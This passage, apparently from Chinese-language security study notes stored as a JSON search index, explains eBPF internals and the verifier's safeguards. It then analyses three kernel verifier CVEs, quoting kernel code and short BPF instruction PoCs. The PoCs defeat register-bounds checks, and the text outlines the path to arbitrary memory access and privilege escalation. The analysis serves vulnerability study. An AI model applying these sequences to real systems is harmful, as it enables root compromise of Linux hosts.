\u7a0b\u5e8f\u662f\u4e8b\u4ef6\u9a71\u52a8\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0ceBPF \u7a0b\u5e8f\u901a\u8fc7\u52a0\u8f7d\u4e00\u4e9b\u94a9\u5b50\uff08hook\uff09\u6765\u5728\u67d0\u4e9b\u4e8b\u4ef6\u53d1\u751f\u7684\u65f6\u5019\u89e6\u53d1\u6267\u884c\u3002\u8fd9\u4e9b\u4e8b\u4ef6\u5305\u542b\u9884\u5b9a\u4e49\u7684\u7cfb\u7edf\u8c03\u7528\u3001\u51fd\u6570\u5165/\u51fa\u53e3\u70b9\u3001\u5185\u6838\u8ddf\u8e2a\u70b9\u3001\u7f51\u7edc\u4e8b\u4ef6\u7b49\uff0c\u9664\u6b64\u4e4b\u5916\u4e5f\u53ef\u4ee5\u901a\u8fc7\u521b\u5efa\u5185\u6838\u63a2\u9488\uff08kprobe\uff09\u6216\u8005\u7528\u6237\u63a2\u9488\uff08uprobe\uff09\u6765\u5728\u5185\u6838\u548c\u7528\u6237\u7a0b\u5e8f\u7684\u51e0\u4e4e\u6240\u6709\u4f4d\u7f6e\u52a0\u8f7d eBPF \u7a0b\u5e8f\uff1a</p> <p>\u5f00\u53d1\u8005\u53ef\u4ee5\u901a\u8fc7 bcc\u3001bpftrace\u3001eBPF Go Library\u3001libbpf \u7b49\u5404\u79cd\u8bed\u8a00\u7684 SDK \u6765\u7f16\u5199 eBPF \u7a0b\u5e8f\u5e76\u7f16\u8bd1\u5230 eBPF \u5b57\u8282\u7801\u3002\u63a5\u4e0b\u6765\u901a\u8fc7 bpf \u7cfb\u7edf\u8c03\u7528\u5c06\u7a0b\u5e8f\u52a0\u8f7d\u5165 Linux \u5185\u6838\u4e2d\uff0c\u968f\u540e\u88ab\u4e8b\u4ef6\u89e6\u53d1\u8fdb\u884c\u6267\u884c\u3002eBPF \u7a0b\u5e8f\u7684\u7ed3\u679c\u901a\u8fc7 maps \u7ed3\u6784\u6216\u8005 event \u6765\u8fd4\u56de\u7ed9\u7528\u6237\uff0cmaps \u662f\u5b58\u50a8 eBPF \u7a0b\u5e8f\u6240\u4f7f\u7528\u7684\u6570\u636e\u7ed3\u6784\u7684\u7a7a\u95f4\uff0c\u9700\u8981\u7531\u7528\u6237\u8fdb\u7a0b\u901a\u8fc7 bpf \u7cfb\u7edf\u8c03\u7528\u6765\u7533\u8bf7\u521b\u5efa\uff0c\u63a5\u4e0b\u6765 eBPF \u7a0b\u5e8f\u548c\u7528\u6237\u7a0b\u5e8f\u90fd\u53ef\u4ee5\u8bbf\u95ee\u8fd9\u5757 map\uff0c\u4ece\u800c\u8fdb\u884c\u6570\u636e\u4ea4\u6362\u3002</p> <p>eBPF \u7a0b\u5e8f\u4f7f\u7528\u4e00\u4e2a RISC \u6307\u4ee4\u96c6\uff0c\u53ef\u4ee5\u8bbf\u95ee R0-R10 \u8fd9 11 \u4e2a\u5bc4\u5b58\u5668\uff0c\u5bf9\u5e94 x64 CPU \u4e2d\u7684 rax/rdi/rsi/rdx/rcx/r8/rbx/r13/r14/r15/rbp\u3002\u5e76\u4e14\u6bcf\u6761\u6307\u4ee4\u4e3a\u4ee5\u4e0b\u7ed3\u6784\uff1a</p> <pre><code>struct bpf_insn {\n    __u8    code;       /* opcode */\n    __u8    dst_reg:4;  /* dest register */\n    __u8    src_reg:4;  /* source register */\n    __s16   off;        /* signed offset */\n    __s32   imm;        /* signed immediate constant */\n};\n\n// \u5373\u7c7b\u4f3c BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2) \u7684\u5f62\u5f0f\n</code></pre> <p>\u52a0\u8f7d eBPF \u7a0b\u5e8f\u6709\u4ee5\u4e0b\u6b65\u9aa4\uff1a</p> <ul> <li>\u8c03\u7528 <code>syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr))</code> \u6765\u7533\u8bf7\u521b\u5efa\u4e00\u4e2a map\uff1b</li> <li>\u8c03\u7528 <code>syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr))</code> \u6765\u52a0\u8f7d eBPF \u7a0b\u5e8f\uff0cattr \u4e2d\u5b58\u50a8\u6307\u4ee4\u6570\u91cf\u3001\u9996\u5730\u5740\u548c\u65e5\u5fd7\u7ea7\u522b\u7b49\u5c5e\u6027\uff1b<ul> <li>\u63a5\u4e0b\u6765\u4f1a\u8fdb\u884c eBPF \u7a0b\u5e8f\u7684\u9a8c\u8bc1\u3001\u7f16\u8bd1\uff0c\u5e76\u5c06\u5176\u52a0\u8f7d\u5230\u5185\u6838\u4e2d\uff1b</li> </ul> </li> </ul>"},{"location":"sec/syssec/project/#ebpf_5","title":"eBPF \u5b89\u5168\u8bbe\u8ba1","text":"<p>eBPF \u4f5c\u4e3a\u4e00\u79cd\u6302\u8f7d\u5728\u5185\u6838\u5404\u79cd\u4f4d\u7f6e\u5e76\u5728\u5185\u6838\u6001\u6267\u884c\u7684\u7a0b\u5e8f\uff0c\u4e14\u8fd0\u884c\u5728\u8bb8\u591a\u5173\u952e\u8f6f\u4ef6\u57fa\u7840\u8bbe\u65bd\u7ec4\u4ef6\u7684\u6838\u5fc3\u4f4d\u7f6e\uff0c\u5176\u5b89\u5168\u6027\u81f3\u5173\u91cd\u8981\u3002eBPF \u5728\u52a0\u8f7d\u8fc7\u7a0b\u4e2d\u901a\u8fc7\u4ee5\u4e0b\u8fc7\u7a0b\u548c\u673a\u5236\u6765\u4fdd\u8bc1\u5b89\u5168\u6027\uff1a</p> <ul> <li>\u9664\u975e\u542f\u7528\u4e86\u975e\u7279\u6743 eBPF\uff0c\u5426\u5219\u53ea\u6709 root \u7528\u6237\u6216\u6388\u4e88\u4e86 CAP_BPF \u6743\u9650\u7684\u7528\u6237\u624d\u80fd\u52a0\u8f7d eBPF \u7a0b\u5e8f\uff1b<ul> <li>\u610f\u5473\u7740\u53ea\u6709\u53d7\u4fe1\u4efb\u7684\u7a0b\u5e8f\u624d\u80fd\u52a0\u8f7d eBPF \u7a0b\u5e8f\uff1b</li> <li>\u800c\u4e14\u5373\u4f7f\u5f00\u542f\u4e86\u975e\u7279\u6743 eBPF\uff0c\u5176\u5bf9\u5185\u6838\u7684\u8bbf\u95ee\u529f\u80fd\u4e5f\u4f1a\u53d7\u5230\u9650\u5236\uff1b</li> </ul> </li> <li>\u5728\u8fdb\u884c JIT \u7f16\u8bd1\u524d\uff0c\u9700\u8981\u5148\u901a\u8fc7 Verifier \u5b89\u5168\u9a8c\u8bc1\uff0c\u4fdd\u8bc1\u4e86\uff1a<ul> <li>\u4e00\u4e2a eBPF \u7a0b\u5e8f\u4e00\u5b9a\u4f1a\u8fd0\u884c\u76f4\u81f3\u7ed3\u675f\uff0c\u4e0d\u4f1a\u963b\u585e\u6216\u8005\u65e0\u9650\u5faa\u73af\uff1b</li> <li>\u7a0b\u5e8f\u4e0d\u80fd\u4f7f\u7528\u672a\u521d\u59cb\u5316\u7684\u53d8\u91cf\u6216\u8bbf\u95ee\u8d8a\u754c\u5185\u5b58\uff1b</li> <li>\u7a0b\u5e8f\u5fc5\u987b\u7b26\u5408\u5927\u5c0f\u9650\u5236\uff0c\u5e76\u4e14\u6709\u6709\u9650\u7684\u590d\u6742\u6027\uff1b</li> </ul> </li> <li>\u5728\u9a8c\u8bc1\u540e\u8fd8\u4f1a\u8fdb\u884c\u7a0b\u5e8f\u7684\u52a0\u56fa\uff0c\u8fdb\u884c\u4e86\u4ee5\u4e0b\u7684\u4fdd\u62a4\uff1a<ul> <li>\u52a0\u8f7d\u540e\u7684 eBPF \u7a0b\u5e8f\u90e8\u5206\u7684\u5185\u5b58\u53d8\u4e3a\u53ea\u8bfb\uff0c\u5373\u4e0d\u5141\u8bb8 eBPF \u7a0b\u5e8f\u53d7\u5230\u4efb\u4f55\u6709\u610f\u65e0\u610f\u7684\u4fee\u6539\uff1b</li> <li>\u901a\u8fc7\u8c03\u6574\u5185\u5b58\u8bbf\u95ee\u6765\u7f13\u89e3 Spectre \u5206\u652f\u9884\u6d4b\u4fa7\u4fe1\u9053\u6f0f\u6d1e\uff1b</li> <li>\u5bf9\u4ee3\u7801\u8fdb\u884c\u5e38\u91cf\u76f2\u5316\uff08Constant Blinding\uff09\uff0c\u9632\u6b62 JIT \u55b7\u5c04\u653b\u51fb\uff0c\u9632\u6b62\u5c06\u53ef\u6267\u884c\u4ee3\u7801\u4f5c\u4e3a\u5e38\u91cf\u6ce8\u5165\u7b49\uff1b</li> </ul> </li> <li>\u8fd0\u884c\u65f6\u9650\u5236\u5185\u6838\u5185\u5b58\u8bbf\u95ee\uff1a<ul> <li>eBPF \u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee\u4efb\u610f\u5185\u6838\u5185\u5b58\uff0c\u53ea\u80fd\u901a\u8fc7 helper \u51fd\u6570\u6765\u8bbf\u95ee\u7a0b\u5e8f\u5916\u7684\u5185\u5b58\uff0c\u4fdd\u8bc1\u4e86\u6570\u636e\u4e00\u81f4\u6027\uff1b<ul> <li>helper \u662f\u5185\u6838\u63d0\u4f9b\u7684\u4e00\u7ec4\u901a\u7528\u4e14\u7a33\u5b9a\u7684 API\uff0c\u4e3a eBPF \u63d0\u4f9b\u4e86\u6269\u5c55\u7684\u529f\u80fd\uff1b</li> </ul> </li> <li>eBPF \u901a\u8fc7 Maps \u6765\u5b58\u50a8\u548c\u68c0\u7d22\u5404\u79cd\u6570\u636e\u7ed3\u6784\u4e2d\u7684\u6570\u636e\uff0c\u4f7f\u5f97\u7a0b\u5e8f\u672c\u8eab\u548c\u7528\u6237\u7a7a\u95f4\u90fd\u53ef\u4ee5\u8fdb\u884c\u8bbf\u95ee\u3002</li> </ul> </li> </ul>"},{"location":"sec/syssec/project/#ebpf_6","title":"eBPF \u6280\u672f\u76f8\u5173\u5b89\u5168\u6f0f\u6d1e\u5206\u6790","text":"<p>\u867d\u7136 eBPF \u901a\u8fc7 Verifier \u7b49\u591a\u79cd\u624b\u6bb5\u4fdd\u8bc1\u4e86\u5176\u5b89\u5168\u6027\uff0c\u4f46\u6bd5\u7adf\u5176\u5904\u4e8e\u5185\u6838\u6001\u8fd0\u884c\u800c\u4e14\u529f\u80fd\u4ee3\u7801\u590d\u6742\uff0c\u6240\u4ee5\u4e0d\u53ef\u907f\u514d\u7684\u4f1a\u51fa\u73b0\u4e00\u4e9b\u6f0f\u6d1e\u3002\u4e0b\u9762\u4ecb\u7ecd\u4e00\u4e9b eBPF \u66fe\u51fa\u73b0\u8fc7\u7684\u6f0f\u6d1e\u53ca\u5176\u57fa\u672c\u539f\u7406\u3002</p>"},{"location":"sec/syssec/project/#cve-2020-8835","title":"CVE-2020-8835","text":"<p>\u8fd9\u4e2a\u6f0f\u6d1e\u7531 Manfred Paul \u4e8e 2020 \u5e74\u5728 Pwn2Own \u4e0a\u63d0\u51fa\uff0c\u5229\u7528 eBPF \u7684\u6f0f\u6d1e\u662f\u4e0b\u4e86 Linux \u7cfb\u7edf\u7684\u63d0\u6743\u3002\u6f0f\u6d1e\u7684\u539f\u7406\u662f\u5728 verifier \u8fdb\u884c\u5bc4\u5b58\u5668\u68c0\u67e5\u65f6\u5e26\u6709\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u4f7f\u5f97\u901a\u8fc7\u67d0\u4e9b\u6307\u4ee4\u5e8f\u5217\u6765\u7ed5\u8fc7\u5bc4\u5b58\u5668\u503c\u68c0\u67e5\u3002</p> <p>\u6211\u4eec\u77e5\u9053 verifier \u4f1a\u8fdb\u884c\u7a0b\u5e8f\u5b89\u5168\u6027\u7684\u68c0\u67e5\uff0c\u5176\u4e2d\u5c31\u5305\u62ec\u4e86\u8bbf\u5b58\u7684\u5408\u6cd5\u6027\u68c0\u67e5\uff0c\u4e3a\u4e86\u68c0\u67e5\u8bbf\u95ee\u7684\u5730\u5740\uff0c\u5219\u9700\u8981\u68c0\u67e5\u5bc4\u5b58\u5668\u7684\u503c\uff0c\u8bb0\u5f55\u5176\u53ef\u80fd\u51fa\u73b0\u7684\u503c\u7684\u8303\u56f4\u3002\u5728\u4ee3\u7801\u4e2d\uff0cverifier \u901a\u8fc7 <code>bpf_reg_state</code> \u7ed3\u6784\u4f53\u6765\u8bb0\u5f55\u5bc4\u5b58\u5668\u72b6\u6001\uff0c\u5176\u4e2d\u5305\u62ec {s,u}{min,max}_value \u6765\u8bb0\u5f55\u6709\u65e0\u7b26\u53f7\u4e0b\u7684\u6700\u5927\u6700\u5c0f\u503c\uff0c\u5e76\u7528\u4e00\u4e2a <code>tnum</code> \u7ed3\u6784\u4f53\u6765\u4fdd\u5b58\u53ef\u80fd\u503c\uff1a</p> <pre><code>struct bpf_reg_state {\n    ...\n    struct tnum var_off;\n    s64 smin_value;\n    s64 smax_value;\n    u64 umin_value;\n    u64 umax_value;\n    ...\n}\n\nstruct tnum {\n    u64 value; // \u67d0\u4e00 bit \u4e3a 1\uff0c\u5219\u8868\u793a\u8fd9\u4e2a bit \u786e\u5b9a\u4e3a 1\n    u64 mask;  // \u67d0\u4e00 bit \u4e3a 1\uff0c\u5219\u8868\u793a\u8fd9\u4e2a bit \u7684\u503c\u4e0d\u786e\u5b9a\n}\n</code></pre> <p>\u6f0f\u6d1e\u51fa\u73b0\u7684\u51fd\u6570\u4e3a\uff1a</p> <pre><code>static void __reg_bound_offset32(struct bpf_reg_state *reg){\n    u64 mask = 0xffffFFFF;\n    struct tnum range = tnum_range(reg-&gt;umin_value &amp; mask,\n                       reg-&gt;umax_value &amp; mask);\n    struct tnum lo32 = tnum_cast(reg-&gt;var_off, 4);\n    struct tnum hi32 = tnum_lshift(tnum_rshift(reg-&gt;var_off, 32), 32);\n\n    reg-&gt;var_off = tnum_or(hi32, tnum_intersect(lo32, range));\n}\n</code></pre> <p>\u8fd9\u4e2a\u51fd\u6570\u4f1a\u5728\u8fdb\u884c\u5bc4\u5b58\u5668 32 \u4f4d\u64cd\u4f5c\u540e\u66f4\u65b0\u5bc4\u5b58\u5668\u72b6\u6001\u4f7f\u7528\u3002\u8fd9\u91cc\u65b0\u5efa\u4e86\u4e00\u4e2a tnum range\uff0c\u7136\u540e\u6839\u636e\u65e0\u7b26\u53f7\u7684\u8303\u56f4\u66f4\u65b0\u4e86 var_off\u3002\u4f46\u8fd9\u91cc\u521b\u5efa range \u7684\u65f6\u5019\u76f4\u63a5\u53d6\u4e86 64 \u4f4d\u503c\u7684\u4f4e 32 \u4f4d\uff0c\u8fd9\u6837\u5982\u679c\u65e0\u7b26\u53f7\u7684\u8303\u56f4\u662f 0x1 - 0x1_0000_0001\uff0c\u5219\u622a\u65ad\u540e\u4e3a 0x1 - 0x1\uff0c\u8fd9\u6837 var_off \u4e2d\u5c31\u4f1a\u786e\u5b9a\u8fd9\u4e2a\u5bc4\u5b58\u5668\u7684\u503c\u4e00\u5b9a\u4e3a 1\u3002</p> <p>\u6bd4\u5982\u5982\u4e0b\u5229\u7528\u6d41\u7a0b\uff1a</p> <pre><code>BPF_LDX_MEM(BPF_DW, REG_6, REG_9, 0) // r6 = mem[r9+0]\n</code></pre> <p>\u4e4b\u540e r6 \u56e0\u4e3a\u662f\u4ece\u5185\u5b58\u4e2d\u8bfb\u53d6\u51fa\u6765\u7684\u503c\uff0c\u6240\u4ee5 verifier \u4e0d\u786e\u5b9a\uff0c<code>tnum.value</code> \u4e5f\u5c31\u4e3a 0\u3002\u63a5\u4e0b\u6765\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u64cd\u4f5c\u6765\u4f7f\u5f97 r6 \u7684 umin_value \u4e3a 1\uff1a</p> <pre><code>BPF_JMP_IMM(BPF_JGE, REG_6, 1, 1) // if r6 &gt;= 1 goto +1\nBPF_EXIT_INSN()                   // exit\n</code></pre> <p>\u8fd9\u6837\u5982\u679c\u6ca1\u6709 exit\uff0c\u5219 r6 \u4e00\u5b9a\u5927\u4e8e\u7b49\u4e8e 1\uff0c\u6240\u4ee5 umin_value \u5c31\u53d8\u4e3a\u4e86 1\u3002\u540c\u7406\u901a\u8fc7 JMP \u914d\u5408 BPF_JLE\uff0c\u6211\u4eec\u53ef\u4ee5\u4e3a r6 \u8bbe\u7f6e umax_value \u4e3a 0x1_0000_0001\u3002\u7136\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7 JMP32 \u6765\u89e6\u53d1\u6f0f\u6d1e\uff1a</p> <pre><code>BPF_JMP32_IMM(BPF_JNE, REG_6, 5, 1) // if r6 != 5 goto +1\nBPF_EXIT_INSN()                     // exit\n</code></pre> <p>JMP32 \u540e\u4f1a\u5bf9 r6 \u8c03\u7528 <code>__reg_bound_offset32</code>\uff0c\u8fd9\u6837 r6 \u5f97\u5230\u7684\u65b0 var_off \u5c31\u4f1a\u56e0\u4e3a umin_value \u548c umax_value \u622a\u65ad\u81f3 32 \u4f4d\u800c\u786e\u5b9a\u4e3a 1\u3002\u56e0\u6b64\u65e0\u8bba r6 \u7684\u521d\u59cb\u503c\u4e3a\u591a\u5c11\uff08\u53ea\u8981\u5728 0x1 - 0x1_0000_0001 \u4e4b\u95f4\uff09\uff0c\u90fd\u4f1a\u88ab verifier \u786e\u8ba4\u4e3a 1\uff0c\u4ece\u800c\u7ed5\u8fc7\u4e86\u5bc4\u5b58\u5668\u503c\u68c0\u67e5\u3002</p> <p>\u800c\u5229\u7528\u65b9\u6cd5\u4e5f\u5f88\u663e\u7136\uff0c\u6211\u4eec\u53ea\u8981\u4ee4\u6700\u5f00\u59cb\u7684 r6 \u503c\u4e3a 2\uff0c\u8fd9\u6837\u5728\u64cd\u4f5c\u540e r6 \u7684\u5b9e\u9645\u503c\u8fd8\u662f 2\uff0c\u4f46 verifier \u8ba4\u4e3a\u5176\u662f 1\u3002\u7136\u540e\u6211\u4eec\u5c06 r6 \u53f3\u79fb\u4e00\u4f4d\uff0c\u8fd9\u6837 r6 \u5b9e\u9645\u503c\u4e3a 1 \u4f46 verifier \u4e3a\u8ba4\u4e3a\u5176\u4e3a 0\u3002\u7136\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u4e3a r6 \u4e58\u4efb\u610f\u503c\u6765\u5f97\u5230\u4efb\u610f\u503c\uff0c\u800c verifier \u59cb\u7ec8\u8ba4\u4e3a\u5176\u4e3a 0\uff0c\u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u8fdb\u884c\u8d8a\u754c\u7684\u4efb\u610f\u5730\u5740\u8bfb\u5199\uff0c\u4ece\u800c\u5b9e\u73b0\u63d0\u6743\u3002</p> <p>\u89e3\u51b3\u6f0f\u6d1e\u7684\u65b9\u5f0f\u4e5f\u5f88\u663e\u7136\uff0c<code>__reg_bound_offset32</code> \u662f\u4e3a\u4e86\u5bf9 32 \u4f4d\u6307\u4ee4\u4f18\u5316\u800c\u5f15\u5165\u7684\uff0c\u4f46\u5bf9\u4e8e\u503c\u7684\u622a\u65ad\u5904\u7406\u5e76\u4e0d\u53ef\u53d6\uff0c\u6240\u4ee5\u5220\u6389\u8fd9\u4e2a\u51fd\u6570\uff0c\u5bf9\u6240\u6709\u6307\u4ee4\u90fd\u8fdb\u884c 64 \u4f4d\u7684\u66f4\u65b0\u5373\u53ef\u89e3\u51b3\u3002</p>"},{"location":"sec/syssec/project/#cve-2020-27194","title":"CVE-2020-27194","text":"<p>\u8fd9\u4e2a\u6f0f\u6d1e\u662f\u7531 Simon \u5728 fuzz Linux \u7684 ebpf \u6a21\u5757\u7684\u65f6\u5019\u53d1\u73b0\u7684\u4e00\u4e2a\u8d8a\u754c\u8bfb\u5199\u6f0f\u6d1e\uff0c\u540e\u7531 360 \u5b89\u5168\u5b9e\u73b0\u8be5\u6f0f\u6d1e\u7684\u63d0\u6743\u5229\u7528\u3002\u6f0f\u6d1e\u7684\u539f\u7406\u548c\u524d\u9762\u7684 CVE-2020-8835 \u975e\u5e38\u7c7b\u4f3c\uff0c\u4e5f\u662f\u6267\u884c 32 \u4f4d\u6307\u4ee4\u540e\u66f4\u65b0\u5bc4\u5b58\u5668\u503c\u51fa\u73b0\u4e86\u622a\u65ad\u9519\u8bef\u3002</p> <p>\u5728 CVE-2020-8835 \u540e\uff0c\u7814\u7a76\u4eba\u5458\u4e5f\u53d1\u73b0\u4e86\u53ea\u4fdd\u5b58 64 \u4f4d\u53d6\u503c\u7684\u8bdd\u6709\u4e00\u4e9b\u5305\u542b 32 \u4f4d\u64cd\u4f5c\u7684\u6307\u4ee4\u5e8f\u5217\u5373\u4f7f\u662f\u5408\u6cd5\u7684\u53ef\u80fd\u4e5f\u4e0d\u4f1a\u901a\u8fc7 verifier \u7684\u68c0\u67e5\uff0c\u6240\u4ee5\u4f4d <code>bpf_reg_state</code> \u7ed3\u6784\u4f53\u4e2d\u6dfb\u52a0\u4e86 {s,u}32_{min,max}_value \u56db\u4e2a\u5b57\u6bb5\u6765\u8bb0\u5f55\u4f4e 32 \u4f4d\u7684\u53d6\u503c\u8303\u56f4\uff0c\u5e76\u4e3a\u6bcf\u6761\u6307\u4ee4\u5206\u522b\u66f4\u65b0 32 \u4f4d\u548c 64 \u4f4d\u7684\u53d6\u503c\u8303\u56f4\u3002\u800c\u672c\u6f0f\u6d1e\u7684\u95ee\u9898\u5728\u4e8e <code>scalar32_min_max_or</code> \u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u4e2d\u4f1a\u610f\u5916\u622a\u65ad\uff1a</p> <pre><code>static void scalar32_min_max_or(struct bpf_reg_state *dst_reg,\n                struct bpf_reg_state *src_reg)\n{\n    ...\n    } else {\n        /* ORing two positives gives a positive, so safe to\n         * cast result into s64.\n         */\n        dst_reg-&gt;s32_min_value = dst_reg-&gt;umin_value;\n        dst_reg-&gt;s32_max_value = dst_reg-&gt;umax_value;\n    }\n}\n</code></pre> <p>\u5728\u51fd\u6570\u7684\u672b\u5c3e\u672c\u6253\u7b97\u5c06 32 \u4f4d\u7684\u65e0\u7b26\u53f7\u503c\u5199\u56de 32 \u4f4d\u6709\u7b26\u53f7\u503c\u7684\u8303\u56f4\u4e2d\uff08\u56e0\u4e3a\u786e\u5b9a\u4e86\u90fd\u662f\u6b63\u6570\uff0c\u4e0d\u4f1a\u51fa\u73b0\u6ea2\u51fa\uff09\uff0c\u4f46\u4ee3\u7801\u4e2d\u5199\u7684\u662f umin_value \u548c umax_value\uff0c\u5373 64 \u4f4d\u7684\u65e0\u7b26\u53f7\u8303\u56f4\uff0c\u8fd9\u6837\u8fd9\u91cc\u5c31\u4f1a\u76f4\u63a5\u622a\u65ad\uff0c\u5bfc\u81f4\u548c CVE-2020-8835 \u4e00\u6837\u7684\u95ee\u9898\u3002\u6bd4\u5982\u5982\u4e0b PoC\uff1a</p> <pre><code>BPF_LDX_MEM(BPF_DW, REG_5, REG_4, 0)    // r5 = mem[r4+0]\nBPF_JMP_IMM(BPF_JGT, REG_5, 0, 1)       // if r5 &gt; 0 goto +1\nBPF_EXIT_INSN()                         // exit\nBPF_LD_IMM64(REG_6, 0x100000001)        // r6 = 0x100000001\nBPF_JMP_REG(BPF_JLT, REG_5, REG_6, 1)   // if r5 &lt; r6 goto +1\nBPF_EXIT_INSN()                         // exit\n</code></pre> <p>\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u8bbe\u7f6e r5 \u7684 64 \u4f4d\u8303\u56f4\u4e3a 0x1 - 0x1_0000_0001\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u901a\u8fc7 or \u6765\u89e6\u53d1\u8fd9\u4e2a\u6f0f\u6d1e\uff1a</p> <pre><code>BPF_ALU64_IMM(BPF_OR, REG_5, 0)         // r5 = r5 | 0\nBPF_MOV32_REG(REG_7, REG_5)             // r7 = r5(low 32)\n</code></pre> <p>\u524d\u4e00\u6761\u6307\u4ee4\u8fdb\u884c\u4e86 or \u8fd0\u7b97\uff0cverifier \u4f1a\u8c03\u7528 <code>scalar32_min_max_or</code> \u548c <code>scalar_min_max_or</code> \u6765\u66f4\u65b0\uff0c\u4f46 32 \u4f4d\u7248\u672c\u7684\u672b\u5c3e\u8bbe\u7f6e s32_max_value \u7684\u65f6\u5019\u51fa\u73b0\u4e86\u622a\u65ad\uff0c0x1_0000_0001 \u88ab\u622a\u65ad\u4e3a\u4e86 0x1\uff0c\u8fd9\u4e5f\u5c31\u8ba9 verifier \u8ba4\u4e3a r5 \u7684\u4f4e 32 \u4e3a\u503c\u5c31\u662f 1\uff0c\u7136\u540e\u6211\u4eec\u901a\u8fc7 MOV32 \u6307\u4ee4\u5c31\u53ef\u4ee5\u5c06\u5176\u503c\u8d4b\u503c\u5230 64 \u4f4d\u5bc4\u5b58\u5668\u4e2d\u3002</p> <p>\u540c\u7406\u50cf CVE-2020-8835 \u4e00\u6837\u5229\u7528\uff0c\u4ee4 r5 \u503c\u4e3a 2\uff0cverifier \u4f1a\u5c06\u5176\u8ba4\u4e3a 1\uff0c\u63a5\u4e0b\u6765\u53f3\u79fb\u4e00\u4f4d\u518d\u4e58\u4ee5\u4efb\u610f\u503c\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u7684\u8bfb\u5199\uff0c\u4ece\u800c\u5b9e\u73b0\u63d0\u6743\u3002</p>"},{"location":"sec/syssec/project/#cve-2021-3490","title":"CVE-2021-3490","text":"<p>\u8fd9\u4e2a\u6f0f\u6d1e\u4e5f\u4e3a Manfred Paul \u53d1\u73b0\uff0c\u548c CVE-2020-27194 \u4e00\u6837\u90fd\u662f verifier \u68c0\u67e5\u5bc4\u5b58\u5668 32 \u4f4d\u503c\u8303\u56f4\u65f6\u51fa\u73b0\u4e86\u9519\u8bef\u8bbe\u7f6e\u3002\u672c\u6f0f\u6d1e\u7684\u95ee\u9898\u5728\u4e8e\u5bf9\u4e8e ALU \u8fd0\u7b97\u6307\u4ee4\uff0c\u5982\u679c src \u548c dst \u503c\u90fd\u5b8c\u5168\u786e\u5b9a\uff0c\u5219 32 \u4f4d\u66f4\u65b0\u51fd\u6570\u4f1a\u76f4\u63a5\u8fd4\u56de\uff08\u56e0\u4e3a\u5f00\u53d1\u8005\u5047\u8bbe 64 \u4f4d\u7684\u51fd\u6570\u4f1a\u66f4\u65b0\u8303\u56f4\uff09\uff0c\u800c 64 \u4f4d\u66f4\u65b0\u51fd\u6570\u4f1a\u8c03\u7528 <code>__mark_reg_known</code> \u51fd\u6570\u6765\u8bbe\u7f6e 64 \u548c 32 \u4f4d\u7684\u8303\u56f4\u4e3a\u540c\u6837\u7684\u503c\uff1a</p> <pre><code>static void scalar32_min_max_and(struct bpf_reg_state *dst_reg,\n                 struct bpf_reg_state *src_reg)\n{\n    ...\n    if (src_known &amp;&amp; dst_known)\n        return;\n    ...\n}\n\nstatic void scalar_min_max_and(struct bpf_reg_state *dst_reg,\n                   struct bpf_reg_state *src_reg)\n{\n    ...\n    if (src_known &amp;&amp; dst_known) {\n        __mark_reg_known(dst_reg, dst_reg-&gt;var_off.value &amp;\n                      src_reg-&gt;var_off.value);\n        return;\n    }\n    ...\n}\n\nstatic void __mark_reg_known(struct bpf_reg_state *reg, u64 imm)\n{\n    ...\n    reg-&gt;smin_value = (s64)imm;\n    reg-&gt;smax_value = (s64)imm;\n    reg-&gt;umin_value = imm;\n    reg-&gt;umax_value = imm;\n\n    reg-&gt;s32_min_value = (s32)imm;\n    reg-&gt;s32_max_value = (s32)imm;\n    reg-&gt;u32_min_value = (u32)imm;\n    reg-&gt;u32_max_value = (u32)imm;\n}\n</code></pre> <p>\u4f46\u662f\u5728\u4f4e 32 \u4f4d\u786e\u5b9a\u7684\u60c5\u51b5\u4e0b\uff0c64 \u4f4d\u4e0d\u4e00\u5b9a\u90fd\u786e\u5b9a\uff0c\u6240\u4ee5\u53ef\u80fd\u5e76\u4e0d\u4f1a\u8c03\u7528\u5230 <code>__mark_reg_known</code> \u6765\u66f4\u65b0\u8303\u56f4\uff0c\u8fd9\u6837\u5728 <code>adjust_scalar_min_max_vals</code> \u51fd\u6570\u672b\u5c3e\u66f4\u65b0\u5bc4\u5b58\u5668\u8fb9\u754c\u7684\u65f6\u5019\u5c31\u4f1a\u51fa\u73b0\u95ee\u9898\uff1a</p> <pre><code>static int adjust_scalar_min_max_vals(struct bpf_verifier_env *env,\n                      struct bpf_insn *insn,\n                      struct bpf_reg_state *dst_reg,\n                      struct bpf_reg_state src_reg)\n{\n    ...\n    case BPF_AND:\n        dst_reg-&gt;var_off = tnum_and(dst_reg-&gt;var_off, src_reg.var_off);\n        scalar32_min_max_and(dst_reg, &amp;src_reg);\n        scalar_min_max_and(dst_reg, &amp;src_reg);\n        break;\n    ...\n    __update_reg_bounds(dst_reg); // \u8c03\u7528 __update_reg32_bounds \u548c __update_reg64_bounds\n    ...\n}\n\nstatic void __update_reg32_bounds(struct bpf_reg_state *reg)\n{\n    struct tnum var32_off = tnum_subreg(reg-&gt;var_off);\n\n    /* min signed is max(sign bit) | min(other bits) */\n    reg-&gt;s32_min_value = max_t(s32, reg-&gt;s32_min_value, var32_off.value | (var32_off.mask &amp; S32_MIN));\n    /* max signed is min(sign bit) | max(other bits) */\n    reg-&gt;s32_max_value = min_t(s32, reg-&gt;s32_max_value, var32_off.value | (var32_off.mask &amp; S32_MAX));\n    reg-&gt;u32_min_value = max_t(u32, reg-&gt;u32_min_value, (u32)var32_off.value);\n    reg-&gt;u32_max_value = min(reg-&gt;u32_max_value, (u32)(var32_off.value | var32_off.mask));\n}\n</code></pre> <p>\u6bd4\u5982\u6211\u4eec\u53ef\u4ee5\u6784\u9020 r2\uff0c\u5176 mask \u4e3a 0xffffffff_00000000\u3001value \u4e3a 0x1\uff0c\u5373\u53ea\u6709\u4f4e 32 \u4f4d\u786e\u5b9a\u4e3a 